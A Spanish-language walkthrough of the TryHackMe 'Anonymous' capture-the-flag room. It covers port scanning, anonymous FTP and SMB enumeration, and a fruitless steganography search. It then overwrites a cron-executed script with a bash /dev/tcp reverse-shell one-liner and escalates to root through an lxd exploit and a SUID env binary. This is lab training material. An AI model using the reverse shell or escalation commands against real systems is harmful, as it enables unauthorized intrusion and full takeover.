# Anonymous - TryHackMe

## Reconocimiento

Vamos a realizar un escaneo de puertos con nmap para identificar los servicios que están corriendo en la máquina objetivo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.128.170.171 -oG allPorts

PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 62
22/tcp  open  ssh          syn-ack ttl 62
139/tcp open  netbios-ssn  syn-ack ttl 62
445/tcp open  microsoft-ds syn-ack ttl 62
```

Veamos las versiones de los servicios que están corriendo en la máquina objetivo.

```bash
nmap -sCV -p21,22,139,445 10.128.170.171

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.154.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-22T21:29:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2026-07-22T21:29:07+00:00
```

Vemos un vsftpd 2.0.8 corriendo en el puerto 21, un OpenSSH 7.6p1 corriendo en el puerto 22 y un Samba smbd 4.7.6-Ubuntu corriendo en los puertos 139 y 445.

Vemos que se nos permite el acceso anónimo al FTP:

```bash
ftp 10.128.170.171

ftp> ls
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts

ftp> cd scripts
ftp> ls
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1032 Jul 22 21:31 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Nos traemos los archivos del directorio `scripts` a nuestra máquina local para analizarlos.

```bash
cat to_do.txt

I really need to disable the anonymous login...it's really not safe
```

```bash
catn clean.sh
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

```bash
cat removed_files.log

Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

Sospecho que hay una tarea cron que ejecuta el script `clean.sh`.

Veamos lo que hay en el puerto 139 y 445 con `smbclient`.

```bash
smbclient -L 10.128.170.171 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            ANONYMOUS
```

```bash
smbmap -H 10.128.170.171

[+] IP: 10.128.170.171:445	Name: 10.128.170.171      	Status: NULL Session
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	pics                                              	READ ONLY	My SMB Share Directory for Pics
	IPC$                                              	NO ACCESS	IPC Service (anonymous server (Samba, Ubuntu))
```

```bash
nxc smb 10.128.170.171

SMB         10.128.170.171  445    ANONYMOUS        [*] Unix - Samba (name:ANONYMOUS) (domain:) (signing:False) (SMBv1:True) (Null Auth:True)
```

Vemos que hay un recurso compartido llamado `pics` al que podemos acceder de forma anónima y que tiene permisos de solo lectura. Vamos a ver qué archivos hay en ese recurso compartido.

```bash
smbclient //10.128.170.171/pics -N

smb: \> ls
  .                                   D        0  Sun May 17 12:11:34 2020
  ..                                  D        0  Thu May 14 02:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 01:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 01:43:42 2020
```

Son fotos de perros.

Vamos a pasarles las siguientes herramientas: `steghide, stegseek, exiftool, binwalk, foremost` para ver si encontramos algo interesante en las fotos.

```bash
exiftool corgo2.jpg

Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
```

Vemos que hay datos binarios en la foto `corgo2.jpg`, vamos a extraerlos con `exiftool`.

```bash
exiftool -b -RedTRC corgo2.jpg > red.bin
exiftool -b -GreenTRC corgo2.jpg > green.bin
exiftool -b -BlueTRC corgo2.jpg > blue.bin

# Las analizamos

strings red.bin green.bin blue.bin
cat red.bin green.bin blue.bin
xxd red.bin green.bin blue.bin
binwalk red.bin green.bin blue.bin
```

No encontramos nada interesante en los archivos binarios extraídos de la foto, las curvas de color no nos dan ninguna pista.

```bash
exiftool puppos.jpeg

Thumbnail Image                 : (Binary data 5751 bytes, use -b option to extract)

Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
```

```bash
exiftool -b -RedTRC puppos.jpeg > red.bin
exiftool -b -GreenTRC puppos.jpeg > green.bin
exiftool -b -BlueTRC     puppos.jpeg > blue.bin
exiftool -b -ThumbnailImage puppos.jpeg > thumbnail.bin
```

Probamos lo mismo pero nada, sin embargo, la thumbnail nos da esta información:

```bash
file thumbnail.bin
thumbnail.bin: JPEG image data, baseline, precision 8, 144x96, components 3

mv thumbnail.bin thumbnail.jpeg
```

Despues de probar mil cosas, creo que esto es un rabbit hole, ya que no encontramos nada interesante en las fotos.

Voy a retomar mi teoría de que hay una tarea cron que ejecuta el script `clean.sh`.

Vemos que tenemos permisos de escritura en el directorio `/var/ftp/scripts`, vamos a crear un archivo llamado `clean.sh` con el siguiente contenido:

```bash
#!/bin/bash

bash -i >& /dev/tcp/192.168.154.96/4444 0>&1
```

Efectivamente , cuando la tarea cron ejecuta el script `clean.sh`, nos da una shell reverse en nuestra máquina.

```bash
namelessone@anonymous:~$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Vemos que pertenecemos al grupo `lxd`, vamos a buscar exploits para escalar privilegios con `searchsploit`.

Además vemos la flag de usuario en el home del usuario.

```bash
searchsploit lxd
Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh
```

Lo subimos al servidor ftp y lo ejecutamos para escalar privilegios a root.

En nuestra máquina local:

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
bash build-alpine
```

En la máquina objetivo:

```bash
chmod 777 46978.sh
./46978.sh
```

Ahora abría que ir a /mnt/root y podríamos ver la flag de root en el archivo `root.txt`, sin embargo, acabo de darme cuenta de que hay una manera más fácil de escalar privilegios a root:


```bash
find / -perm -4000 2>/dev/null
/usr/bin/env

namelessone@anonymous:/var/ftp/scripts$ env /bin/bash -p
bash-4.4# whoami
root
```

Vamos a la ruta `/root` y vemos la flag de root en el archivo `root.txt`.